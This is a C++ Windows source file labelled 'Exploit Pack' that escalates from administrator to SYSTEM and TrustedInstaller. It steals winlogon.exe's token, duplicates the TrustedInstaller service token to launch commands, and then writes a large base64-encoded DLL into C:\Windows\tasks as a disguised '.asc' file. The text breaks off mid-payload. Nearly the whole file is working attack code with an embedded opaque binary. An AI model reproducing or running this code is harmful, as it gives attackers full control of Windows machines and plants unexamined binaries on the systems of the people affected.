#include <string>
#include <iostream>
#include <codecvt>
#include <Windows.h>
#include <TlHelp32.h>
#include <fstream>
#include <tchar.h>

using namespace std;

void enable_privilege(string privilege_name)
{
	HANDLE token_handle;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &token_handle))
		throw runtime_error("OpenProcessToken failed: " + to_string(GetLastError()));

	LUID luid;
	if (!LookupPrivilegeValue(nullptr, privilege_name.c_str(), &luid))
	{
		CloseHandle(token_handle);
		throw runtime_error("LookupPrivilegeValue failed: " + to_string(GetLastError()));
	}

	TOKEN_PRIVILEGES tp;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(token_handle, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr))
	{
		CloseHandle(token_handle);
		throw runtime_error("AdjustTokenPrivilege failed: " + to_string(GetLastError()));
	}

	CloseHandle(token_handle);
}

DWORD get_process_id_by_name(const string process_name)
{
	HANDLE snapshot_handle;
	if ((snapshot_handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
	{
		throw runtime_error("CreateToolhelp32Snapshot failed: " + to_string(GetLastError()));
	}

	DWORD pid = -1;
	PROCESSENTRY32 pe;
	ZeroMemory(&pe, sizeof(PROCESSENTRY32));
	pe.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(snapshot_handle, &pe))
	{
		while (Process32Next(snapshot_handle, &pe))
		{
			if (pe.szExeFile == process_name)
			{
				pid = pe.th32ProcessID;
				break;
			}
		}
	}
	else
	{
		CloseHandle(snapshot_handle);
		throw runtime_error("Process32First failed: " + to_string(GetLastError()));
	}

	if (pid == -1)
	{
		CloseHandle(snapshot_handle);
		throw runtime_error("process not found: " + process_name);
	}

	CloseHandle(snapshot_handle);
	return pid;
}

void impersonate_system()
{
	const auto system_pid = get_process_id_by_name("winlogon.exe");
	HANDLE process_handle;
	if ((process_handle = OpenProcess(
		PROCESS_QUERY_LIMITED_INFORMATION,
		FALSE,
		system_pid)) == nullptr)
	{
		throw runtime_error("OpenProcess failed (winlogon.exe): " + to_string(GetLastError()));
	}

	HANDLE token_handle;
	if (!OpenProcessToken(
		process_handle,
		TOKEN_DUPLICATE,
		&token_handle))
	{
		CloseHandle(process_handle);
		throw runtime_error("OpenProcessToken failed (winlogon.exe): " + to_string(GetLastError()));
	}
	CloseHandle(process_handle);

	HANDLE dup_token_handle;
	SECURITY_ATTRIBUTES token_attributes;
	token_attributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	token_attributes.lpSecurityDescriptor = nullptr;
	token_attributes.bInheritHandle = FALSE;
	if (!DuplicateTokenEx(
		token_handle,
		TOKEN_ALL_ACCESS,
		&token_attributes,
		SecurityImpersonation,
		TokenImpersonation,
		&dup_token_handle))
	{
		CloseHandle(token_handle);
		throw runtime_error("DuplicateTokenEx failed (winlogon.exe): " + to_string(GetLastError()));
	}
	CloseHandle(token_handle);

	if (!ImpersonateLoggedOnUser(dup_token_handle))
	{
		CloseHandle(dup_token_handle);
		throw runtime_error("ImpersonateLoggedOnUser failed: " + to_string(GetLastError()));
	}
	CloseHandle(dup_token_handle);
}

int start_trusted_installer_service()
{
	SC_HANDLE sc_manager_handle;
	if ((sc_manager_handle = OpenSCManager(
		nullptr,
		SERVICES_ACTIVE_DATABASE,
		SC_MANAGER_CONNECT)) == nullptr)
	{
		throw runtime_error("OpenSCManager failed: " + to_string(GetLastError()));
	}

	SC_HANDLE service_handle;
	if ((service_handle = OpenServiceW(
		sc_manager_handle,
		L"TrustedInstaller",
		SERVICE_QUERY_STATUS | SERVICE_START)) == nullptr)
	{
		CloseServiceHandle(sc_manager_handle);
		throw runtime_error("OpenService failed: " + to_string(GetLastError()));
	}
	CloseServiceHandle(sc_manager_handle);

	SERVICE_STATUS_PROCESS status_buffer;
	DWORD bytes_needed;
	while (QueryServiceStatusEx(
		service_handle,
		SC_STATUS_PROCESS_INFO,
		reinterpret_cast<LPBYTE>(&status_buffer),
		sizeof(SERVICE_STATUS_PROCESS),
		&bytes_needed))
	{
		if (status_buffer.dwCurrentState == SERVICE_STOPPED)
		{
			if (!StartServiceW(service_handle, 0, nullptr))
			{
				CloseServiceHandle(service_handle);
				throw runtime_error("StartService failed: " + to_string(GetLastError()));
			}
		}
		if (status_buffer.dwCurrentState == SERVICE_START_PENDING ||
			status_buffer.dwCurrentState == SERVICE_STOP_PENDING)
		{
			Sleep(status_buffer.dwWaitHint);
			continue;
		}
		if (status_buffer.dwCurrentState == SERVICE_RUNNING)
		{
			CloseServiceHandle(service_handle);
			return status_buffer.dwProcessId;
		}
	}
	CloseServiceHandle(service_handle);
	throw runtime_error("QueryServiceStatusEx failed: " + to_string(GetLastError()));
}

void create_process_as_trusted_installer(const DWORD pid, string command_line)
{
	enable_privilege(SE_DEBUG_NAME);
	enable_privilege(SE_IMPERSONATE_NAME);
	impersonate_system();

	HANDLE process_handle;
	if ((process_handle = OpenProcess(
		PROCESS_QUERY_LIMITED_INFORMATION,
		FALSE,
		pid)) == nullptr)
	{
		throw runtime_error("OpenProcess failed (TrustedInstaller.exe): " + to_string(GetLastError()));
	}

	HANDLE token_handle;
	if (!OpenProcessToken(
		process_handle,
		TOKEN_DUPLICATE,
		&token_handle))
	{
		CloseHandle(process_handle);
		throw runtime_error("OpenProcessToken failed (TrustedInstaller.exe): " + to_string(GetLastError()));
	}
	CloseHandle(process_handle);

	HANDLE dup_token_handle;
	SECURITY_ATTRIBUTES token_attributes;
	token_attributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	token_attributes.lpSecurityDescriptor = nullptr;
	token_attributes.bInheritHandle = FALSE;
	if (!DuplicateTokenEx(
		token_handle,
		TOKEN_ALL_ACCESS,
		&token_attributes,
		SecurityImpersonation,
		TokenImpersonation,
		&dup_token_handle))
	{
		CloseHandle(token_handle);
		throw runtime_error("DuplicateTokenEx failed (TrustedInstaller.exe): " + to_string(GetLastError()));
	}
	CloseHandle(token_handle);

	STARTUPINFOW startup_info;
	GetStartupInfoW(&startup_info);
	PROCESS_INFORMATION process_info;
	ZeroMemory(&process_info, sizeof(PROCESS_INFORMATION));
	if (!CreateProcessWithTokenW(
		dup_token_handle,
		LOGON_WITH_PROFILE,
		nullptr,
		const_cast<LPWSTR>(wstring_convert<codecvt_utf8<wchar_t>>().from_bytes(command_line).c_str()),
		CREATE_UNICODE_ENVIRONMENT,
		nullptr,
		nullptr,
		&startup_info,
		&process_info))
	{
		CloseHandle(dup_token_handle);
		throw runtime_error("CreateProcessWithTokenW failed: " + to_string(GetLastError()));
	}
	CloseHandle(dup_token_handle);
}

int main(int argc, char* argv[])
{
	try
	{
		// Get SYSTEM and run a BAT file
		MessageBox(NULL, _T("Run SYSTEM commands from admin privs."), _T("Exploit Pack"), MB_OK | MB_SYSTEMMODAL);
		ofstream new_dll;
		new_dll.open("c:\\Windows\\tasks\\dbgcore.asc");
		new_dll << "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\r\nZQFFeGl0VGhyZWFkAABLRVJORUwzMi5kbGwAAAgAX19DX3NwZWNpZmljX2hhbmRs\r\nZXIAACUAX19zdGRfdHlwZV9pbmZvX2Rlc3Ryb3lfbGlzdAAAPgBtZW1zZXQAAFZD\r\nUlVOVElNRTE0MC5kbGwAADYAX2luaXR0ZXJtADcAX2luaXR0ZXJtX2UAPwBfc2Vo\r\nX2ZpbHRlcl9kbGwAGABfY29uZmlndXJlX25hcnJvd19hcmd2AAAzAF9pbml0aWFs\r\naXplX25hcnJvd19lbnZpcm9ubWVudAAANABfaW5pdGlhbGl6ZV9vbmV4aXRfdGFi\r\nbGUAACIAX2V4ZWN1dGVfb25leGl0X3RhYmxlABYAX2NleGl0AABhcGktbXMtd2lu\r\nLWNydC1ydW50aW1lLWwxLTEtMC5kbGwA0wRSdGxDYXB0dXJlQ29udGV4dADaBFJ0\r\nbExvb2t1cEZ1bmN0aW9uRW50cnkAAOEEUnRsVmlydHVhbFVud2luZAAAvAVVbmhh\r\nbmRsZWRFeGNlcHRpb25GaWx0ZXIAAHsFU2V0VW5oYW5kbGVkRXhjZXB0aW9uRmls\r\ndGVyAB0CR2V0Q3VycmVudFByb2Nlc3MAmgVUZXJtaW5hdGVQcm9jZXNzAACJA0lz\r\nUHJvY2Vzc29yRmVhdHVyZVByZXNlbnQAUARRdWVyeVBlcmZvcm1hbmNlQ291bnRl\r\ncgAeAkdldEN1cnJlbnRQcm9jZXNzSWQAIgJHZXRDdXJyZW50VGhyZWFkSWQAAPAC\r\nR2V0U3lzdGVtVGltZUFzRmlsZVRpbWUAbANJbml0aWFsaXplU0xpc3RIZWFkAIID\r\nSXNEZWJ1Z2dlclByZXNlbnQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nzV0g0mbU//8yot8tmSsAAP////8AAAAAAQAAAAIAAAAvIAAAAAAAAAD4AAAAAAAA\r\nAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAHBAAAEAmAAAwEAAA\r\nURAAAEgmAABUEAAApBAAAEAmAACkEAAAuhEAAEwmAAC8EQAAQBIAAJAmAABAEgAA\r\ncRMAAOQmAAB0EwAAsRMAABQnAAC0EwAA6BMAADgnAADoEwAAuRQAACQnAAC8FAAA\r\nLRUAACwnAAAwFQAA3BUAAEAnAAAIFgAAIxYAAEAmAAAkFgAAXRYAAEAmAABgFgAA\r\nlBYAAEAmAACUFgAAqRYAAEAmAACsFgAA1BYAAEAmAADUFgAA6